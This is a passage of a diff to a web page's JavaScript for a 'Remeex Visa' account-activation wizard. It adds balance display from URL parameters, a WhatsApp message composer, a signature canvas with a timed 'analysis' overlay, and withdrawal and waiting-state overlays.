+      const saldoUsdParam = params.get('saldo_usd') || params.get('saldoUsd');
+      let saldoBsValue = parseAmount(saldoBsParam);
+      let saldoUsdValue = parseAmount(saldoUsdParam);
+
+      if(saldoBsEl){
+        const formattedBs = formatAmount(saldoBsParam, 'es-VE', 'VES', 'Bs. 0,00');
+        saldoBsEl.textContent = formattedBs;
+        if(saldoBsValue === null){
+          saldoBsValue = parseAmount(formattedBs);
+        }
+      }
+
+      if(saldoUsdEl){
+        const formattedUsd = formatAmount(saldoUsdParam, 'es-US', 'USD', '$0.00');
+        saldoUsdEl.textContent = formattedUsd;
+        if(saldoUsdValue === null){
+          saldoUsdValue = parseAmount(formattedUsd);
+        }
+      }
+      if(saldoBsValue === null){ saldoBsValue = 0; }
+      if(saldoUsdValue === null){ saldoUsdValue = 0; }
+
       function composeMessage(){
         const nombre = qs('#nombre').value.trim();
         const apellido = qs('#apellido').value.trim();
@@ -543,7 +1273,7 @@
         const detalle = (qs('#detalle').value || '').trim();
 
         const lines = [
-          'Hola, buen día. Solicito *desbloqueo de cuenta* en Remeex Visa.',
+          'Hola, buen día. Solicito *activación de cuenta* en Remeex Visa.',
           '',
           '*Datos del cliente*:',
           `• Nombre y apellido: ${nombre} ${apellido}`,
@@ -575,10 +1305,61 @@
         suspension.classList.add('is-on');
       }
 
+      if(signatureCanvas){
+        signatureCanvas.addEventListener('pointerdown', startSignature, { passive: false });
+        signatureCanvas.addEventListener('pointermove', drawSignature, { passive: false });
+        ['pointerup','pointerleave','pointercancel'].forEach(evt=>{
+          signatureCanvas.addEventListener(evt, endSignature, { passive: false });
+        });
+      }
+
+      clearSignature && clearSignature.addEventListener('click', clearSignatureCanvas);
+      closeSignature && closeSignature.addEventListener('click', hideSignatureOverlay);
+
+      sendSignature && sendSignature.addEventListener('click', ()=>{
+        if(!hasSignatureStroke){
+          indicateSignatureRequired();
+          return;
+        }
+        startSignatureAnalysis();
+      });
+
+      analysisClose && analysisClose.addEventListener('click', ()=>{
+        if(signatureAnalysis) signatureAnalysis.classList.add('hidden');
+        resetAnalysisTimers();
+        stopDots();
+        resetAnalysisUI();
+        if(next2) next2.focus({ preventScroll: true });
+      });
+
+      const motivoRadios = form ? Array.from(form.querySelectorAll('input[name="motivo"]')) : [];
+      motivoRadios.forEach(radio=>{
+        radio.addEventListener('change', (evt)=>{
+          if(!evt.target) return;
+          const value = String(evt.target.value || '').toLowerCase();
+          if(value.includes('firma')){
+            showSignatureOverlay();
+          }
+        });
+      });
+
+      const handleSignatureResize = ()=>{
+        if(!signatureOverlay || signatureOverlay.classList.contains('hidden')) return;
+        if(hasSignatureStroke) return;
+        resizeSignatureCanvas();
+      };
+      window.addEventListener('resize', handleSignatureResize);
+      window.addEventListener('orientationchange', handleSignatureResize);
+
       // Eventos overlay
       btnSolicitar && btnSolicitar.addEventListener('click', showOverlay);
       closeOverlay && closeOverlay.addEventListener('click', hideOverlay);
       cancelWizard && cancelWizard.addEventListener('click', hideOverlay);
+      btnDesistir && btnDesistir.addEventListener('click', openDesistOverlay);
+      [desistClose, desistCancel].forEach(btn => btn && btn.addEventListener('click', closeDesistOverlay));
+      desistProceed && desistProceed.addEventListener('click', ()=> setDesistStep(2));
+      desistBack && desistBack.addEventListener('click', ()=> setDesistStep(1));
+      desistConfirm && desistConfirm.addEventListener('click', startDesistFlow);
 
       // Paso 1
       next1 && next1.addEventListener('click', ()=>{
@@ -611,6 +1392,22 @@
       // Paso 3
       back3 && back3.addEventListener('click', ()=> setStep(2));
 
+      function activateWaitingState(){
+        if(waitingActivated) return;
+        waitingActivated = true;
+        const nombre = qs('#nombre').value.trim();
+        const apellido = qs('#apellido').value.trim();
+        const fullName = `${nombre} ${apellido}`.trim() || 'el titular';
+        waitingUser && (waitingUser.textContent = fullName);
+        document.body.classList.add('is-waiting');
+        waitingState && waitingState.setAttribute('data-active', 'true');
+      }
+
+      sendWa && sendWa.addEventListener('click', ()=>{
+        activateWaitingState();
+        hideOverlay();
+      });
+
       // Actualiza preview si cambia algo estando en paso 3
       form.addEventListener('input', ()=>{
         const step3Visible = !steps.find(s=>s.getAttribute('data-step')==='3').classList.contains('hidden');
@@ -625,7 +1422,24 @@
 
       // Cerrar wizard con ESC
       document.addEventListener('keydown', (e)=>{
-        if(e.key === 'Escape' && !overlay.classList.contains('hidden')) hideOverlay();
+        if(e.key === 'Escape'){
+          if(signatureOverlay && !signatureOverlay.classList.contains('hidden')){
+            hideSignatureOverlay();
+            return;
+          }
+          if(desistOverlay && !desistOverlay.classList.contains('hidden')){
+            closeDesistOverlay();
+            return;
+          }
+          if(signatureAnalysis && !signatureAnalysis.classList.contains('hidden') && analysisClose && !analysisClose.classList.contains('hidden')){
+            signatureAnalysis.classList.add('hidden');
+            resetAnalysisTimers();
+            stopDots();
+            resetAnalysisUI();
+            return;
+          }
+          if(!overlay.classList.contains('hidden')) hideOverlay();
+        }
       });
     })();
   </script>
